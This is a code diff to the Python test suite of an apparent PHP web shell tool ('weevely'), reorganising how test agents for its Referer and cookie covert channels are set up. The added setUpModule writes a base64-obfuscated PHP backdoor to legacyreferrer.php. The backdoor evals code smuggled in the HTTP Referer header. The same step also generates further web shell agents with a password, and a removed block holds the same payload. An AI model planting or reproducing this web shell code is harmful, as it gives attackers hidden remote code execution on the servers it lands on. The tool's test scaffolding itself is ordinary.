@@ -1,13 +1,12 @@
-from testsuite.base_test import BaseTest
+from tests.base_test import BaseTest
 from core.channels.channel import Channel
 from core.weexceptions import DevException
 import utils
-from testsuite.config import script_folder, script_folder_url, test_stress_channels
 from core.generate import generate, save_generated
 import os
 import random
 import unittest
-from testsuite import config
+from tests import config
 from core.loggers import stream_handler
 import logging
 import subprocess
@@ -15,6 +14,22 @@ import tempfile
 import core.config
 import socket
 
+def setUpModule():
+    subprocess.check_output("""
+BASE_FOLDER="{config.base_folder}/test_channels/"
+PWD="{config.password}"
+rm -rf "$BASE_FOLDER"
+mkdir -p "$BASE_FOLDER"
+echo "<?php eval(base64_decode('cGFyc2Vfc3RyKCRfU0VSVkVSWy\
+dIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2FzJyAmJiBj\
+b3VudCgkYSk9PTkpIHsgZWNobyAnPGRhc2Q+JztldmFsKGJhc2U2NF9kZWN\
+vZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGE\
+sY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L2Rhc2Q+Jzt9')); ?>" > "$BASE_FOLDER/legacyreferrer.php"
+python ./weevely.py generate -agent stegaref_php_debug "$PWD" "$BASE_FOLDER/stegaref_php_debug.php"
+python ./weevely.py generate -agent legacycookie_php "$PWD" "$BASE_FOLDER/legacycookie_php.php"
+""".format(
+config = config
+), shell=True)
 
 def _get_google_ip():
     try:
@@ -103,7 +118,7 @@ class StegaRefChannelWrongCert(BaseTest):
             self.fail("test_wrong_cert exception\n%s" % (str(e)))
 
 @unittest.skipIf(
-    not test_stress_channels,
+    not config.test_stress_channels,
     "Test only default generator agent")
 class AgentDEFAULTObfuscatorDefault(StegaRefChannel):
 
@@ -121,24 +136,14 @@ class AgentDEFAULTObfuscatorDefault(StegaRefChannel):
 
 
 @unittest.skipIf(
-    not test_stress_channels,
-    "Test only default generator agent")
-class AgentDEBUGObfuscatorCLEARTEXT(AgentDEFAULTObfuscatorDefault):
-
-    @classmethod
-    def setUpClass(cls):
-        cls._randomize_bd()
-        obfuscated = generate(cls.password, agent='stegaref_php_debug')
-        save_generated(obfuscated, cls.path)
-
-
-
-@unittest.skipIf(
-    not test_stress_channels,
+    not config.test_stress_channels,
     "Test only default generator agent")
 class LegacyCookieChannel(BaseTest):
 
+    url = config.base_url + '/test_channels/legacycookie_php.php'
+
     def setUp(self):
+        
         self.channel = Channel(
             'LegacyCookie',
             {
@@ -161,22 +166,6 @@ class LegacyCookieChannel(BaseTest):
                     'echo("%s");' %
                     payload)[0],
                 payload)
-
-    @classmethod
-    def setUpClass(cls):
-        cls._randomize_bd()
-        obfuscated = generate(cls.password, agent='legacycookie_php')
-        save_generated(obfuscated, cls.path)
-
-    @classmethod
-    def tearDownClass(cls):
-
-        # Check the agent presence, could be already deleted
-        if os.path.isfile(cls.path):
-            subprocess.check_call(
-                config.cmd_env_remove_s % cls.path,
-                shell=True
-            )
 
     def test_1_100_requests(self):
         self._incremental_requests(1, 100, 1, 2)
@@ -223,9 +212,20 @@ class LegacyCookieChannel(BaseTest):
             self.fail("LegacyCookie test_wrong_cert exception\n%s" % (str(e)))
 
 @unittest.skipIf(
-    not test_stress_channels,
+    not config.test_stress_channels,
+    "Test only default generator agent")
+class AgentDEBUGObfuscatorCLEARTEXT(AgentDEFAULTObfuscatorDefault):
+
+    url = config.base_url + '/test_channels/stegaref_php_debug.php'
+
+
+@unittest.skipIf(
+    not config.test_stress_channels,
     "Test only default generator agent")
 class LegacyReferrerChannel(BaseTest):
+
+    url = config.base_url + '/test_channels/legacyreferrer.php'
+    password = 'asdasd'
 
     def setUp(self):
         self.channel = Channel(
@@ -250,54 +250,6 @@ class LegacyReferrerChannel(BaseTest):
                     'echo("%s");' %
                     payload)[0],
                 payload)
-
-    @classmethod
-    def setUpClass(cls):
-
-        if config.debug:
-            stream_handler.setLevel(logging.DEBUG)
-        else:
-            stream_handler.setLevel(logging.INFO)
-
-        cls._randomize_bd()
-        cls.password = 'asdasd'
-
-        # Check `config.script_folder` permissions, comparing just the
-        # last 3 digits
-
-        if (
-            subprocess.check_output(
-                config.cmd_env_stat_permissions_s % (config.script_folder),
-                shell=True).strip()[-3:]
-            != config.script_folder_expected_perms[-3:]
-            ):
-            raise DevException(
-                "Error: give the required permissions to the folder \'%s\'"
-                % config.script_folder
-            )
-
-
-        obfuscated = """<?php eval(base64_decode('cGFyc2Vfc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2FzJyAmJiBjb3VudCgkYSk9PTkpIHsgZWNobyAnPGRhc2Q+JztldmFsKGJhc2U2NF9kZWNvZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGEsY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L2Rhc2Q+Jzt9')); ?>"""
-
-        tmp_handler, tmp_path = tempfile.mkstemp()
-        save_generated(obfuscated, tmp_path)
-        subprocess.check_call(
-            config.cmd_env_move_s_s % (tmp_path, cls.path),
-            shell=True)
-
-        subprocess.check_call(
-            config.cmd_env_chmod_s_s % ('0777', cls.path),
-            shell=True)
-
-    @classmethod
-    def tearDownClass(cls):
-
-        # Check the agent presence, could be already deleted
-        if os.path.isfile(cls.path):
-            subprocess.check_call(
-                config.cmd_env_remove_s % cls.path,
-                shell=True
-            )
 
     def test_1_100_requests(self):
         self._incremental_requests(1, 100, 1, 2)
